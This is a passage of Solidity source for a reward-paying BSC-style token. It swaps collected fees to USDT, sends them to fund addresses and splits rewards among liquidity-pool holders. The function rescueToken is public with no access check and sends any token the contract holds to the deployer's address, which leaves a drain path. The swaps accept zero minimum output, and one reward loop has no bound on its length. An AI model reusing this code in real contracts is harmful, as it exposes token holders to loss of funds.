            ldxOverAmount = ldxOverAmount.add(ldxSwapAmount);
            swapTokensForUsdt2ldx(ldxSwapAmount);
        }

        allTokenAmount = super.balanceOf(address(this));
        if(allTokenAmount > 10**15){
            swapTokensForUsdt(allTokenAmount);
        }
    }
	
	function _isAddLiquidityV2()internal view returns(bool ldxAdd, uint256 otherAmount){

        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        (uint r0,,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
        uint bal0 = IERC20(token0).balanceOf(address(uniswapV2Pair));
        if( token0 != address(this) ){
			if( bal0 > r0){
				otherAmount = bal0 - r0;
				ldxAdd = otherAmount > 10**15;
			}
		}
    }

    function rescueToken(address tokenAddress, uint256 tokens) public returns (bool){	
		return IERC20(tokenAddress).transfer(_contractSender, tokens);
    }
	
	function _isDelLiquidityV2() internal view returns(bool ldxDel, bool bot, uint256 otherAmount){

        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        (uint reserves0,,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
        uint amount = IERC20(token0).balanceOf(address(uniswapV2Pair));
		if(token0 != address(this)){
			if(reserves0 > amount){
				otherAmount = reserves0 - amount;
				ldxDel = otherAmount > 10**10;
			}else{
				bot = reserves0 == amount;
			}
		}
    }

    function swapTokensForUsdt2Fund(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
		address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _baseToken;
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            _fundAddress,
            block.timestamp
        );
    }

    function swapTokensForUsdt2DownFund(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
		address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _baseToken;
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            _fundDownAddress,
            block.timestamp
        );
    }

    function swapTokensForUsdt2buySun(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
		address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = _baseToken;
        path[2] = address(XGZGS);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            _destroyAddress,
            block.timestamp
        );
    }

    function swapTokensForUsdt2ldx(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
		address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _baseToken;
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            _ldxAddress,
            block.timestamp
        );
    }    

    function swapTokensForUsdt(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
		address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _baseToken;
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(reward),
            block.timestamp
        );
        reward.withdraw();
    }
    

    uint256 public dayAmount = 1666 * 10**18;
    uint256 public lastDay;
    uint256 public num;
    address[] ldxUser;
    mapping(address => bool) public haveLdxPush;

	function _splitTokenLdxToken() private {
        uint256 allTokenAmount = XGZGS.balanceOf(address(this));
		if(allTokenAmount >= dayAmount && num < 160){
            uint256 nowDay = block.timestamp.div(86400);
            if(nowDay > lastDay){lastDay = nowDay; num = num + 1;
                _splitOtherTokenLdx(dayAmount);
            }
		}
    }

    function getLdxSize() public view returns(uint256){
        return ldxUser.length;
    }

	uint256 public startLdxIndex;
    function _splitOtherTokenLdx(uint256 thisAmount) private {
		uint256 buySize = ldxUser.length;
		uint256 totalLpAmount = pair.totalSupply();
		if(buySize>0 && totalLpAmount > 0){
			address user;
			uint256 ldxRewardTokenAmount;
			if(buySize > 0){
				for(uint256 i=0;i<buySize;i++){
					user = ldxUser[i];
					ldxRewardTokenAmount = pair.balanceOf(user).mul(thisAmount).div(totalLpAmount);
					if(ldxRewardTokenAmount > 10**10){
						XGZGS.transfer(user, ldxRewardTokenAmount);
					}
				}
			}
		}
    }
	
    function _splitUsdtLdxUsdt() private {
        uint256 allTokenAmount = USDT.balanceOf(address(this));
		if(allTokenAmount >= 10**15){
			_splitOtherUsdtLdx(allTokenAmount.div(5).mul(4));
		}
    }

	uint256 public startLdxUIndex;
    function _splitOtherUsdtLdx(uint256 thisAmount) private {
		uint256 buySize = ldxUser.length;
		uint256 totalLpAmount = pair.totalSupply();
		if(buySize>0 && totalLpAmount > 0){
			address user;
			uint256 ldxRewardTokenAmount;
			if(buySize >20){
				for(uint256 i=0;i<20;i++){
					if(startLdxUIndex >= buySize){startLdxUIndex = 0;}
					user = ldxUser[startLdxUIndex];
                    ldxRewardTokenAmount = pair.balanceOf(user).mul(thisAmount).div(totalLpAmount);
                    if(ldxRewardTokenAmount > 10**15){
                        USDT.transfer(user, ldxRewardTokenAmount);
                    }
					startLdxUIndex = startLdxUIndex.add(1);
				}
			}else{
				for(uint256 i=0;i<buySize;i++){
					user = ldxUser[i];
					ldxRewardTokenAmount = pair.balanceOf(user).mul(thisAmount).div(totalLpAmount);
                    if(ldxRewardTokenAmount > 10**15){
                        USDT.transfer(user, ldxRewardTokenAmount);
                    }
				}
			}
		}
    }
}